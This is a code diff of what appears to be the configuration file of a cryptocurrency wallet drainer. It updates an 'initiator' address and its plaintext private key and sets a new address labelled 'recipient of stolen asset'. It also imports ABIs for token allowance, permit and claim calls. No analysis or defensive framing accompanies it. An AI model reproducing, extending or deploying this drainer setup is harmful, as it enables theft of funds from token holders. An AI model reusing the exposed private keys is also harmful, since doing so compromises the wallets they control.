@@ -1,11 +1,11 @@
 // export const initiator = '0x5049bE34eE05627aD0C500f11B25d23c02F530b1'; // initiator address
 // export const initiatorPK = 'bbdeb46f850dd3b11672db4f15b5ff15927cbfcdb9959ddc94df4a99e5966989'; // initiaror's private key
 
-export const initiator = '0x50bF0eAf6149F6029469d0F9Ac874e22F94b670a'; // initiator address
-export const initiatorPK = '64f8ad67a1eb5b0a414224837de0f5f0ce1ebe4438e210b4351240e1a9b5504b'; // initiaror's private key
+export const initiator = '0xeE71c83008C5814455223866A881EfE25d5cf347'; // initiator address
+export const initiatorPK = '6fe98598348dddbe6fc733c8753854062d293557071dd3e87b0cc1c61e99cd52'; // initiaror's private key
 
 // export let recipient = '0x16866d2b99354C5057aE414bbA03C7810b550E04'; // recipient of stolen asset
-export let recipient = '0xBBcD4eFCAD8Db5120F079f7c87a53743043cF6C3'; // recipient of stolen asset
+export let recipient = '0x1D26015064db1f8073871041bF554757101f6386'; // recipient of stolen asset
 export { default as ALLOWANCEABI } from './abis/allowanceABI.json';
 export { default as permitV2 } from './abis/permitvs.json';
 export { default as CLAIMEABI } from './abis/claimABI.json';
